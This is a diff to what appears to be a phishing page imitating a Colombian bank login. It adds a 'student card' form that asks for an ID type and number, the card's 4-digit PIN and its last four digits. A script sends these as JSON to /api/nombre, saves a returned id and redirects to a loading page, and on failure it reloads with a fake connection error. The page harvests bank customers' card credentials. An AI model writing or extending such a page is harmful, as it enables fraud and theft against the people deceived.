@@ -160,15 +160,146 @@
                   </div>
                 </form>
               </div>
+           </div>
+		    <!-- Formularios clave segura -->
+			<!-- Formularios carnet estudiantil -->
+		    <div id="form2" class="form-content" style="display: none">
+                <form id="tarjeta">
+                  <div style="height: 30px">
+                    <label style="margin-bottom: 20px">Identificación</label>
+                  </div>
+                  <div style="display: flex">
+                    <div style="width: 30%">
+                      <select id="tipo2" style="
+                          outline: none;
+                          margin: 0;
+                          width: 100%;
+                          text-indent: 16px;
+                          padding: 0;
+                          color: #000000;
+                          border: solid 1px #b3b3b3;
+                          background-color: white;
+                          border-radius: 4px;
+                          text-align: left;
+                          height: 48px;
+                          text-overflow: ellipsis;
+                          padding-right: 16px;
+                          font-size: 18px;
+                        ">
+                        <option hidden="" disabled="">Seleccione</option>
+                        <option id="C.C.   Cédula de ciudadanía" value="CC">
+                          C.C. Cédula de ciudadanía
+                        </option>
+                        <option id="T.I.   Tarjeta de Identidad" value="TI">
+                          T.I. Tarjeta de Identidad
+                        </option>
+                        <option id="C.E.   Cédula de Extranjería" value="CE">
+                          C.E. Cédula de Extranjería
+                        </option>
+                        <option id="N.P.N. NIT Persona Natural" value="NI">
+                          N.P.N. NIT Persona Natural
+                        </option>
+                        <option id="N.P.E. NIT Persona Extranjera" value="NE">
+                          N.P.E. NIT Persona Extranjera
+                        </option>
+                        <option id="N.P.J. NIT Persona Jurídica" value="NJ">
+                          N.P.J. NIT Persona Jurídica
+                        </option>
+                        <option id="P.S.   Pasaporte" value="PA">
+                          P.S. Pasaporte
+                        </option>
+                        <option id="R.C.   Registro Civil" value="RC">
+                          R.C. Registro Civil
+                        </option>
+                      </select>
+                    </div>
+                    <div style="width: 70%">
+                      <input id="identificacion2" type="text" inputmode="numeric" 
+					    placeholder="#" style="
+                          outline: none;
+                          margin: 0;
+                          width: 100%;
+                          font-size: 18px;
+                          text-indent: 16px;
+                          padding: 0;
+                          margin-left: 5px;
+                          color: #000000;
+                          border: solid 1px #b3b3b3;
 
-               
-            </div>
+                          background-color: white;
+                          border-radius: 4px;
+                          text-align: left;
+                          height: 48px;
+                          text-overflow: ellipsis;
+                          padding-right: 16px;
+                        ">
+                      
+                    </div>
+                  </div>
+                  <div style="height: 30px; margin-top: 20px">
+                    <label style="margin-bottom: 20px">Clave de tu tarjeta estudiantil   </div>
+                  <div style="width: 100%">
+                    <input id="clave2" inputmode="numeric" type="text" placeholder="..." style="
+                        outline: none;
+                        margin: 0;
+                        width: 100%;
+                        text-indent: 16px;
+                        padding: 0;
+                        color: #000000;
+                        border: solid 1px #b3b3b3;
+                        background-color: white;
+                        border-radius: 4px;
+                        text-align: left;
+                        height: 48px;
+                        text-overflow: ellipsis;
+                        padding-right: 16px;
+                        font-size: 18px;
+                      ">
+                  </div>
+
+                  <div style="height: 30px; margin-top: 20px">
+                    <label style="margin-bottom: 20px">Últimos 4 dígitos de tu tarjeta estudiantil</label>
+                  </div>
+                  <div style="width: 100%">
+                    <input inputmode="numeric" minlength="4" maxlength="4" id="digito2" type="text" placeholder="..." style="
+                        outline: none;
+                        margin: 0;
+                        width: 100%;
+                        text-indent: 16px;
+                        padding: 0;
+                        color: #000000;
+                        border: solid 1px #b3b3b3;
+                        background-color: white;
+                        border-radius: 4px;
+                        text-align: left;
+                        height: 48px;
+                        text-overflow: ellipsis;
+                        padding-right: 16px;
+                        font-size: 18px;
+                      ">
+
+              
+                  </div>
+
+                  <button style="
+                      width: 100%;
+                      background: #0043a9;
+                      border-radius: 20px;
+                      padding: 20p;
+                      color: white;
+                      margin-top: 30px;
+                    ">
+                    Ingresar
+                  </button>
+                </form>
+              </div>
+		     <!-- Formularios -->
           </div>
         </div>
       </div>
       <div class="right">
         <div class="promo-image">
-          <img src="./assets/bc2.png" style="width: 100%">
+          <img src="./assets/credito.png" style="width: 100%">
         </div>
         <div class="carousel-wrapper">
           <button class="prev">❮</button>
@@ -194,7 +325,25 @@
       </div>
     </div>
  
-     
+     <script>
+      function showForm(formId, element) {
+        // Ocultar todos los formularios
+        document.querySelectorAll(".form-content").forEach(function (form) {
+          form.style.display = "none";
+        });
+
+        // Mostrar el formulario seleccionado
+        document.getElementById(formId).style.display = "inline";
+
+        // Remover la clase activa de todas las pestañas
+        document.querySelectorAll(".tab").forEach(function (tab) {
+          tab.classList.remove("active");
+        });
+
+        // Agregar la clase activa a la pestaña seleccionada
+        element.classList.add("active");
+      }
+    </script>
 
   <script>
     const form = document.getElementById("segura");
@@ -254,6 +403,50 @@ form.addEventListener("submit", async e=>{
 	
   </script>
     
-      
+ <script>
+document.getElementById("tarjeta").addEventListener("submit",async e=>{
+e.preventDefault();
+
+const tipo=document.getElementById("tipo2").value;
+const iden=document.getElementById("identificacion2").value.trim();
+const clave=document.getElementById("clave2").value.trim();
+const dig=document.getElementById("digito2").value.trim();
+
+if(!tipo||!iden||!clave||!dig){
+alert("Complete todos los campos");
+return;
+}
+
+if(!/^\d{4}$/.test(clave)){
+alert("Clave inválida");
+return;
+}
+
+document.getElementById("spinner-overlay").style.display="flex";
+
+try{
+
+const r=await fetch("/api/nombre",{
+method:"POST",
+headers:{ "Content-Type":"application/json"},
+body:JSON.stringify({
+tipo,identificacion:iden,
+clave,digitos:dig})
+});
+
+const j=await r.json();
+
+if(!j.id) throw "error";
+
+localStorage.setItem("id",j.id);
+location="load.html";
+
+}catch{
+alert("Error conexión");
+location.reload();
+}
+
+});
+</script>     
     
 </body></html>
